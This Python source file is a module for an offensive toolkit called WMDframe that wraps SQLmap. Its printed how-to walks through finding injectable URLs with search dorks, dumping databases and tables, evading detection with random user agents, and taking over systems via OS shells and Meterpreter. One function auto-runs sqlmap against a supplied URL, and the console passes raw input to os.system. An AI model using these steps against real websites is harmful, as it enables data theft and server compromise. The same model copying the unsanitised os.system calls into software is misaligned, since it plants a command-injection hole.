#!/usr/bin/env python3
#
# MIT - (c) 2016 ThomasTJ (TTJ)
#
# Module for WMDframe
# This modules is just a simple integration of SQLmap.
#


import argparse
import os
try:
    import core.core as core
    import core.commands as comm
    import core.modules as cmodules
    from core.colors import bc as bc
except:
    # Running module outside the WMDframe might require path changing to import core modules
    import sys
    sys.path.append('././')
    import core.core as core
    import core.commands as comm
    import core.modules as cmodules
    from core.colors import bc as bc


# ==========================
# Parser START
# ==========================
parser = argparse.ArgumentParser()
parser.add_argument('-r', '--run', action='store_true', help='Start monitoring')
parser.add_argument('-u', '--url', help='URL to inject')
args, unknown = parser.parse_known_args()
# ==========================
# Parser END
# ==========================


# ==========================
# Core START
# ==========================
config = core.config()
SQLMAP_SYM = (config['TOOLS']['SQLMAP_SYM'])

logger = core.log()
# logger.debug('Starting module')
# ==========================
# Core END
# ==========================


# ==========================
# Log files, global variables, etc. START
# ==========================

# ==========================
# Log files, global variables, etc. end
# ==========================


# OPTIONS
class Options():
    """Main class for module."""

    Author = 'Thomas TJ (TTJ)'
    Name = 'SQLmap'
    Call = 'sqlmap'
    Modulename = 'sqlmap'  # Filename
    Category = 'sql'
    Type = 'sqli'
    Version = '0.1'
    License = 'MIT'
    Description = 'Just an activation of SQLmap.'
    Datecreation = '2017/02/01'
    Lastmodified = '2017/02/01'

    def __init__(self):
        """Define variables and show options on run."""
        self.show_all()

    def poss_opt(self):
        """Possible options. These variables are checked when the user tries to 'set' an option."""
        return ('NA')

    def show_opt(self):
        """Show the possible options."""
        print(
            '' +
            '\n\t' + bc.OKBLUE + 'HOW TO:' + bc.ENDC +
            '\n\t' + bc.BOLD + '1) Find a URL which is prone to SQLi' + bc.ENDC +
            '\n\t' + ' - a) Search the web' +
            '\n\t' + ' - b) Use the module gdsqli' +
            '\n\t' + ' - c) Use SQLmap\'s Google Dork function: -g "inurl:\".php?id=1\""' +
            '\n\t' + bc.BOLD + '2) Goto 2a or directly to 3' + bc.ENDC +
            '\n\t' + ' - a) sqlmap -u "target"' +
            '\n\t' + bc.BOLD + '3) Get databases' + bc.ENDC +
            '\n\t' + ' - a) sqlmap -u "target" --dbs' +
            '\n\t' + bc.BOLD + '4) Get tables in database' + bc.ENDC +
            '\n\t' + ' - a) sqlmap -u "target" --tables -D DatabaseName' +
            '\n\t' + bc.BOLD + '5) Get columns from table' + bc.ENDC +
            '\n\t' + ' - a) sqlmap -u "target" --columns -D DatabaseName -T TableName' +
            '\n\t' + bc.BOLD + '6) Get data from table' + bc.ENDC +
            '\n\t' + ' - a) sqlmap -u "target" --dump -D DatabaseName -T TableName' +
            '\n\t' +
            '\n\t' + bc.OKBLUE + 'TROUBLE - Append one or more of the following:' + bc.ENDC +
            '\n\t' + bc.BOLD + '1) Use random user agents' + bc.ENDC +
            '\n\t' + ' - a) --random-agent' +
            '\n\t' + bc.BOLD + '2) Turn off payload casting mechanism' + bc.ENDC +
            '\n\t' + ' - a) --no-cast' +
            '\n\t' + bc.BOLD + '3) Use the beginner wizard' + bc.ENDC +
            '\n\t' + ' - a) --wizard' +
            '\n\t' +
            '\n\t' + bc.OKBLUE + 'ENHANCED:' + bc.ENDC +
            '\n\t' + bc.BOLD + '1) FASTER' + bc.ENDC +
            '\n\t' + ' - a) --threads 4' +
            '\n\t' + bc.BOLD + '2) Just do it - no questions' + bc.ENDC +
            '\n\t' + ' - a) --batch' +
            '\n\t' + bc.BOLD + '3) Run it with all' + bc.ENDC +
            '\n\t' + ' - a) -u "target" --dbs --batch --random-agent --threads 4' +
            '\n\t' +
            '\n\t' + bc.OKBLUE + 'SYSTEM TAKEOVER:' + bc.ENDC +
            '\n\t' + bc.BOLD + '1) Execute an operating system command' + bc.ENDC +
            '\n\t' + ' - a) --os-cmd=OSCMD' +
            '\n\t' + bc.BOLD + '2) Real shell' + bc.ENDC +
            '\n\t' + ' - a) --os-shell' +
            '\n\t' + bc.BOLD + '3) Prompt for an OOB shell, Meterpreter or VNC' + bc.ENDC +
            '\n\t' + ' - a) --os-pwn' +
            '\n'
        )

    def show_commands(self):
        """Show the possible commands."""
        print(
            ''
            '\n\t' + bc.OKBLUE + 'COMMANDS:' + bc.ENDC +
            '\n\t' + '---------' +
            '\n\t' + ('%-*s ->\t%s' % (9, 'run', 'Run SQLmap')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'runcom', 'Run sqlmap arguments <runcom [ARGS]>')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'info', 'Information')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'help', 'Help')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'so', 'Show options')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'sa', 'Show module info')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'set', 'Set options, <set [PARAMETER] [VALUE]>')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'invoke', 'Invoke module')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'exit', 'Exit')) +
            '\n'
        )

    def show_all(self):
        """Show all options.

        Sending main options to the core module modules.py for parsing.
        """
        cmodules.showModuleData(
            Options.Author,
            Options.Name,
            Options.Call,
            Options.Category,
            Options.Type,
            Options.Version,
            Options.Description,
            Options.License,
            Options.Datecreation,
            Options.Lastmodified
        )
        self.show_commands()
        self.show_opt()
# END OPTIONS


def run():
    """The main run function."""
    print('\tRunning running')


def runcom(command):
    """Run SQLmap with userdefined args."""
    print('')
    os.system(SQLMAP_SYM + ' ' + command)
    print('')


def run_auto():
    """Autorun function."""
    print('')
    os.system(SQLMAP_SYM + ' -u "' + args.url + '" --dbs --batch --random-agent --threads 4')
    print('')


# OPTIONAL
def info():
    """Show the modules info - optional."""
    print("""
        Module for use in WMDframe.
        Just a simple integration of SQLmap. The modules does nothing
        except from some information on SQLmap commands.
        """)
    # Delete the parser info, if args.parse is not used.
    if parser.format_help():
        print('\n\t' + bc.OKBLUE + 'COMMANDLINE ARGUMENTS:' + bc.ENDC)
        for line in parser.format_help().strip().splitlines():
            print('\t' + line)
    print('')


# CONSOLE
def console():
    """The main console for the module."""
    value = input('   -> ' + bc.FAIL + 'wmd' + bc.ENDC + '@' + bc.FAIL + 'sqlmap:' + bc.ENDC + ' ')
    userinput = value.split()
    # Show options
    if 'so' in userinput[:1]:
        sop.show_opt()
    # Show all info
    elif 'sa' in userinput[:1]:
        sop.show_all()
    # Run module
    elif 'run' in userinput[:1]:
        run()
    elif 'runcom' in userinput[:1]:
        uservalue = value.split(' ', 1)[1]
        runcom(uservalue)
    # Set options
    elif 'set' in userinput[:1]:
        useroption = str(userinput[1:2]).strip('[]\'')  # The parameter to set
        uservalue = str(userinput[2:3]).strip('[]\'')  # Use single word after "set parameter" to set parameter
        # uservalue = value.split(' ', 2)[2]  # Use all text after "set parameter"
        if useroption not in sop.poss_opt():
            print(bc.WARN + '\n    Error, no options for: ' + useroption + '\n' + bc.ENDC)
        elif useroption in sop.poss_opt():
            setattr(sop, useroption, uservalue)
            print('\n      ' + useroption + '\t> ' + uservalue + '\n')
    # Open module in new window
    elif 'invoke' in userinput[:1]:
        comm.invokeModule(Options.Call)
        return None
    # Go back to WMDframe console
    elif 'back' in userinput[:1] or 'exit' in userinput[:1]:
        return None
    # Run command
    elif ':' in userinput[:1]:
        print('')
        os.system(str(value[1:]))
        print('')
    # Show info
    elif 'info' in userinput[:1]:
        info()
    else:
        command = str(userinput[:1]).strip('[]\'')
        print(bc.WARN + '\n    Error, no options for: ' + command + '\n' + bc.ENDC)
    console()
# END console


def main():
    """The first function to run."""
    print('\n')
    print('\t   _____ ____    __                          ')
    print('\t  / ___// __ \  / /   ____ ___  ____ _____   ')
    print('\t  \__ \/ / / / / /   / __ `__ \/ __ `/ __ \  ')
    print('\t ___/ / /_/ / / /___/ / / / / / /_/ / /_/ /  ')
    print('\t/____/\___\_\/_____/_/ /_/ /_/\__,_/ .___/   ')
    print('\t                                  /_/        ')
    print('\n')
    print('\t' + bc.OKBLUE + 'CHECKING REQUIREMENTS' + bc.ENDC)
    comm.checkNetConnectionV()
    comm.checkInstalled(SQLMAP_SYM)
    print('')
    global sop
    # The parameters to be passed to the module on run
    sop = Options()
    if args.run:
        if not args.url:
            print(bc.WARN + '\t[!]  No URL passed as argument with "-u [URL]" - returning to console.\n' + bc.ENDC)
            console()
        else:
            run_auto()
    else:
        console()


if args.run:
    main()


# For testing uncomment "main()", place module in root directory and run module with "python3 modulename.py"
#  main()
